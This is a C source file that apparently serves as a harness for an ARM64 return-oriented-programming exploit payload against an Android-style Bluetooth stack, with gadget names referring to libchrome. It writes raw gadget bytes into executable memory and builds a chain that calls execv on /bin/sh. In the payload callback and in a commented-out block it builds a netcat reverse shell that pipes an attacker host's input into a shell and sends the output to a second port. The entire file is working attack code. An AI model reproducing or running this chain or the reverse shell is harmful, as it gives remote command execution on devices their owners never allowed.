#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>

#include <sys/mman.h>
#include <string.h>

#include <unistd.h>
#include <stdlib.h>

char *gadgets = NULL;

#define LIBCHROME_GADGET_ADDRESS (gadgets + 0x0)
#define X0_X21_SYNC_GADGET_ADDRESS (gadgets + 0x100)
#define X0_X21_ADDER_GADGET_ADDRESS (gadgets + 0x200)
#define CALLER_GADGET_ADDRESS (gadgets + 0x300)
#define EXECV_GADGET_ADDRESS (&execv_gadget)

#define memcpy_str(dst, src) memcpy(dst, src, sizeof(src) - 1)

struct payload_generator_data
{
    // In
    char *attacker_ip;
    uint16_t attacker_outgoing_port;
    uint16_t attacker_incoming_port;

    // Out
    uint64_t payload_address;
};

void dump_hex(const uint8_t *buffer, size_t size)
{
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0)
        {
            if (i != 0)
                printf("\n");
            printf("%02X ", buffer[i]);
        }
        else
            printf("%02X ", buffer[i]);
    }

    printf("\n");
}

void execv_gadget(void *x0, void *x1)
{
    printf("execv_gadget\n");
    printf("x0: %p\n", x0);
    printf("x1: %p\n", x1);

    // exit(0);
    execv((char *)x0, (char **)x1);
}

void payload_generator_callback(uint64_t payload_address, uint8_t *payload_data, size_t payload_data_size, void *priv)
{
    printf("Payload address: 0x%016" PRIx64 "\n", payload_address);
    struct payload_generator_data *data = (struct payload_generator_data *)priv;

    char *command;
    int command_len = asprintf(&command, "toybox nc %s %" PRIu16 " | /bin/sh | toybox nc %s %" PRIu16, data->attacker_ip, data->attacker_outgoing_port, data->attacker_ip, data->attacker_incoming_port);

    if (command_len == -1)
    {
        printf("asprintf failed\n");
        exit(1);
    }

    if (0x78 + command_len > payload_data_size)
    {
        printf("Payload too small\n");
        exit(1);
    }

    uint64_t *payload_data_64 = (uint64_t *)payload_data;
    // for (size_t i = 0; i < payload_data_size / sizeof(uint64_t); i++)
    //     payload_data_64[i] = 0xdeadbeefbadc0dedull;

    /* 0x00 */ payload_data_64[0] = payload_address + 0x8;
    /* 0x08 */ payload_data_64[1] = (uint64_t)X0_X21_SYNC_GADGET_ADDRESS;
    /* 0x10 */ payload_data_64[2] = (uint64_t)EXECV_GADGET_ADDRESS;
    /* 0x18 */ payload_data_64[3] = 0;
    /* 0x20 */ payload_data_64[4] = payload_address + 0x58;
    /* 0x28 */ payload_data_64[5] = (uint64_t)X0_X21_ADDER_GADGET_ADDRESS;
    /* 0x30 */ payload_data_64[6] = 0;
    /* 0x38 */ payload_data_64[7] = (uint64_t)CALLER_GADGET_ADDRESS;
    /* 0x40 */ memcpy(payload_data_64 + 8, "/bin/sh\0", 8);
    /* 0x48 */ memcpy(payload_data_64 + 9, "-c\0\0\0\0\0\0", 8);
    /* 0x50 */ payload_data_64[10] = 0;
    /* 0x58 */ payload_data_64[11] = payload_address + 0x40;
    /* 0x60 */ payload_data_64[12] = payload_address + 0x48;
    /* 0x68 */ payload_data_64[13] = payload_address + 0x78;
    /* 0x70 */ payload_data_64[14] = 0;
    /* 0x78 */ memcpy(payload_data_64 + 15, command, command_len);
    /* 0x78 */ memcpy(payload_data_64 + 15, "echo Bluetooth has been Pwned; sleep 7d", 40);

    free(command);

    data->payload_address = payload_address;
}

int main(void)
{
    // Prepare the gadgets
    gadgets = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("Gadgets Address: %p\n", gadgets);

    memcpy_str(LIBCHROME_GADGET_ADDRESS, "\x08\x00\x40\xf9\x08\x01\x40\xf9\xe1\x03\x14\xaa\x00\x01\x3f\xd6");
    memcpy_str(X0_X21_SYNC_GADGET_ADDRESS, "\xf5\x03\x00\xaa\x95\x02\x00\xb4\xa8\x16\x40\xf9\xe0\x03\x15\xaa\x00\x01\x3f\xd6");
    memcpy_str(X0_X21_ADDER_GADGET_ADDRESS, "\xa8\x1e\x40\xf9\xb5\x42\x00\x91\xe0\x03\x15\xaa\x00\x01\x3f\xd6");
    memcpy_str(CALLER_GADGET_ADDRESS, "\xf3\x03\x00\xaa\x73\x02\x00\xb4\x68\x02\x40\xf9\x60\x26\x40\xf9\x61\x0a\x40\xf9\x00\x01\x3f\xd6");

    mprotect(gadgets, 0x1000, PROT_READ | PROT_EXEC);

    // Prepare the payloads
    void *payload = malloc(0x200);

    char attacker_ip[] = "192.168.123.197";
    struct payload_generator_data payload_generator_data = {
        .attacker_ip = attacker_ip,
        .attacker_outgoing_port = 4444,
        .attacker_incoming_port = 4445,
    };

    payload_generator_callback((uint64_t)payload, (uint8_t *)payload, 0x200, &payload_generator_data);
    dump_hex((uint8_t *)payload, 0x200);

    // Run the payload
    void (*first_gadget)(uint64_t) = (void (*)(uint64_t))LIBCHROME_GADGET_ADDRESS;
    first_gadget((uint64_t)payload_generator_data.payload_address);

    // // "nc -nlvp 4444" and "nc -nlvp 4445" on the attacker machine
    // char *args[4] = {"/bin/sh", "-c", "toybox nc 192.168.1.36 4444 | /bin/sh | toybox nc 192.168.1.36 4445", NULL};
    // execv("/bin/sh", args);
    // uint64_t payload_address = 0;

    // void *p = malloc(0x100);
    // printf("HELLO!\n");
    return 0;
}
